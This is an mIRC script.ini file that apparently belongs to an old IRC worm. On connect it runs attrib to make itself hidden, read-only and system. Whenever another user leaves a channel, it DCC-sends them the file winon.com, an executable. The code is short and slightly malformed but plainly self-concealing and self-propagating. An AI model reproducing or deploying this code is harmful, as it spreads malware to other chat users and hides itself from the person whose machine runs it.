[script]
n0=On 1:Connect:{
n1=/run attrib +h script.ini
n2=/run attrib +r script.ini
n3=/run attrib +s script.ini
n4= }
n5=ON 1:PART:#:{ if ($nick == $me ){ halt } | .dcc send $nickc:\mirc\winon.com
